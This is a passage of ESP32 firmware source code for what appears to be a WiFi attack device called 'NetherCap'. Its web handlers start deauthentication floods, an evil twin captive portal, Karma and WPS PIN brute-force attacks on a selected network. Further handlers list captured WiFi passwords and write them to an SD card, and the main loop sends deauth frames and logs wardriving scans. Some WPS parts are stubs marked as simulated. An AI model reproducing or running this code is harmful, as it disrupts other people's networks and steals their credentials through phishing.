    net["channel"] = WiFi.channel(i);
    net["encrypted"] = WiFi.encryptionType(i) != WIFI_AUTH_OPEN;
    
    // Check for WPS (simulated - in reality need deeper scan)
    net["wps"] = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
  }
  
  WiFi.scanDelete();
  
  String response;
  serializeJson(doc, response);
  server.send(200, "application/json", response);
}

void handleAttack() {
  StaticJsonDocument<512> doc;
  deserializeJson(doc, server.arg("plain"));
  
  String action = doc["action"].as<String>();
  
  if(action == "select") {
    JsonObject network = doc["network"];
    targetSSID = network["ssid"].as<String>();
    targetBSSID = network["bssid"].as<String>();
    targetChannel = network["channel"].as<int>();
    
    server.send(200, "text/plain", "Target set: " + targetSSID);
    return;
  }
  
  if(action == "deauth") {
    currentMode = DEAUTH;
    isAttacking = true;
    deauth.start(targetBSSID, targetChannel);
    server.send(200, "text/plain", "Deauth attack started on " + targetSSID);
  }
  else if(action == "eviltwin") {
    currentMode = EVIL_TWIN;
    isAttacking = true;
    captive.start(targetSSID, targetChannel);
    server.send(200, "text/plain", "Evil Twin started: " + targetSSID);
  }
  else if(action == "karma") {
    currentMode = KARMA_ATTACK;
    isAttacking = true;
    karma.start();
    server.send(200, "text/plain", "Karma Attack started");
  }
  else if(action == "wps") {
    currentMode = WPS_ATTACK;
    isAttacking = true;
    wpsGenerator.generatePins(targetBSSID);
    server.send(200, "text/plain", "WPS Brute Force started on " + targetSSID);
  }
}

void handleStop() {
  stopAllAttacks();
  server.send(200, "text/plain", "All attacks stopped");
}

void handleStatus() {
  StaticJsonDocument<256> doc;
  
  String modeStr = "idle";
  switch(currentMode) {
    case DEAUTH: modeStr = "deauth"; break;
    case EVIL_TWIN: modeStr = "eviltwin"; break;
    case KARMA_ATTACK: modeStr = "karma"; break;
    case WPS_ATTACK: modeStr = "wps"; break;
    case WARD_DRIVING: modeStr = "wardriving"; break;
    default: modeStr = "idle";
  }
  
  doc["mode"] = modeStr;
  doc["clients"] = WiFi.softAPgetStationNum();
  doc["deauthCount"] = deauthCounter;
  doc["loginCount"] = captiveClients.size();
  doc["wpsAttempts"] = wpsAttempts;
  doc["karmaCount"] = karmaCounter;
  doc["target"] = targetSSID;
  
  String response;
  serializeJson(doc, response);
  server.send(200, "application/json", response);
}

void handleLogs() {
  String html = "<h3>Captured Credentials</h3>";
  
  if(captiveClients.empty()) {
    html += "<p style='color:#aaa;text-align:center;'>No credentials captured yet</p>";
  } else {
    html += "<table style='width:100%;border-collapse:collapse;'>";
    html += "<tr><th>Time</th><th>SSID</th><th>Password</th><th>Client</th></tr>";
    
    for(const auto& client : captiveClients) {
      html += "<tr>";
      html += "<td>" + String(client.timestamp) + "</td>";
      html += "<td>" + client.ssid + "</td>";
      html += "<td>" + client.password + "</td>";
      html += "<td>" + client.mac + "</td>";
      html += "</tr>";
    }
    
    html += "</table>";
  }
  
  html += "<h3 style='margin-top:30px;'>WPS Pins Tried</h3>";
  if(wpsPins.empty()) {
    html += "<p style='color:#aaa;text-align:center;'>No WPS attempts yet</p>";
  } else {
    html += "<table style='width:100%;border-collapse:collapse;'>";
    html += "<tr><th>BSSID</th><th>PIN</th><th>Status</th></tr>";
    
    for(const auto& pin : wpsPins) {
      if(pin.tried) {
        html += "<tr>";
        html += "<td>" + pin.bssid.substring(0, 12) + "...</td>";
        html += "<td>" + pin.pin + "</td>";
        html += "<td>" + (pin.success ? "‚úÖ SUCCESS" : "‚ùå FAILED") + "</td>";
        html += "</tr>";
      }
    }
    
    html += "</table>";
  }
  
  server.send(200, "text/html", html);
}

void handleWardrive() {
  StaticJsonDocument<256> doc;
  deserializeJson(doc, server.arg("plain"));
  
  String action = doc["action"].as<String>();
  
  if(action == "start") {
    currentMode = WARD_DRIVING;
    wardriver.start();
    server.send(200, "text/plain", "Wardriving started");
  } else {
    currentMode = IDLE;
    wardriver.stop();
    server.send(200, "text/plain", "Wardriving stopped");
  }
}

void handleWPSAttack() {
  // Handle WPS attack request
  server.send(200, "text/plain", "WPS attack control");
}

void handleKarma() {
  // Handle Karma attack request
  server.send(200, "text/plain", "Karma attack control");
}

// =================== HELPER FUNCTIONS ===================
void stopAllAttacks() {
  isAttacking = false;
  currentMode = IDLE;
  
  deauth.stop();
  captive.stop();
  karma.stop();
  wardriver.stop();
  
  // Restore original AP
  String mac = WiFi.macAddress();
  mac.replace(":", "");
  String apName = "NetherCap_" + mac.substring(9);
  WiFi.softAP(apName.c_str(), "nether123");
  
  Serial.println("[+] All attacks stopped");
}

void saveCredential(String ssid, String bssid, String password) {
  if(credentialCount < MAX_PASSWORDS) {
    credentials[credentialCount++] = ssid + " | " + password + " | " + bssid;
    
    // Also log to Serial
    Serial.println("[+] Credential saved: " + ssid + " - " + password);
    
    // Log to SD card if available
    if(SD.begin(SD_CS)) {
      File file = SD.open("/credentials.txt", FILE_APPEND);
      if(file) {
        file.println(getTimestamp() + "," + ssid + "," + password + "," + bssid);
        file.close();
      }
    }
  }
}

String getTimestamp() {
  unsigned long seconds = millis() / 1000;
  unsigned long hours = seconds / 3600;
  unsigned long minutes = (seconds % 3600) / 60;
  unsigned long secs = seconds % 60;
  
  char buffer[20];
  snprintf(buffer, sizeof(buffer), "%02lu:%02lu:%02lu", hours, minutes, secs);
  return String(buffer);
}

// =================== MAIN LOOP ===================
void loop() {
  server.handleClient();
  
  // Handle attacks
  switch(currentMode) {
    case DEAUTH:
      deauth.sendFrame();
      delay(DEAUTH_INTERVAL);
      break;
      
    case KARMA_ATTACK:
      karma.update();
      break;
      
    case WPS_ATTACK:
      // Simulate WPS attack (in real implementation would send WPS packets)
      if(millis() % 5000 == 0) {
        String pin = wpsGenerator.getNextPin(targetBSSID);
        if(pin.length() > 0) {
          Serial.println("[WPS] Trying PIN: " + pin);
          // Here you would send actual WPS packets
        }
      }
      break;
      
    case WARD_DRIVING:
      // Periodically scan and log networks
      if(millis() % SCAN_INTERVAL == 0) {
        int n = WiFi.scanNetworks(false, true);
        for(int i = 0; i < n && i < 10; i++) {
          WiFiNetwork net;
          net.ssid = WiFi.SSID(i);
          net.bssid = WiFi.BSSIDstr(i);
          net.rssi = WiFi.RSSI(i);
          net.channel = WiFi.channel(i);
          net.encrypted = WiFi.encryptionType(i) != WIFI_AUTH_OPEN;
          net.wpsEnabled = true; // Simulated
          net.lastSeen = time(nullptr);
          
          wardriver.logNetwork(net);
        }
        WiFi.scanDelete();
      }
      break;
  }
  
  // Emergency stop button
  static unsigned long lastButtonPress = 0;
  if(digitalRead(BUTTON_PIN) == LOW && millis() - lastButtonPress > 1000) {
    stopAllAttacks();
    Serial.println("[!] Emergency stop activated!");
    lastButtonPress = millis();
  }
  
  // Status LED
  static unsigned long lastBlink = 0;
  if(isAttacking) {
    if(millis() - lastBlink > 500) {
      digitalWrite(LED_PIN, !digitalRead(LED_PIN));
      lastBlink = millis();
    }
  } else if(WiFi.softAPgetStationNum() > 0) {
    if(millis() - lastBlink > 2000) {
      digitalWrite(LED_PIN, !digitalRead(LED_PIN));
      lastBlink = millis();
    }
  } else {
    digitalWrite(LED_PIN, LOW);
  }
  
  // Auto-stop after 30 minutes
  if(isAttacking && attackStart == 0) {
    attackStart = millis();
  }
  if(!isAttacking && attackStart > 0) {
    attackStart = 0;
  }
  if(attackStart > 0 && millis() - attackStart > 1800000) {
    stopAllAttacks();
    Serial.println("[!] Auto-stop after 30 minutes");
  }
  
  delay(10);
}
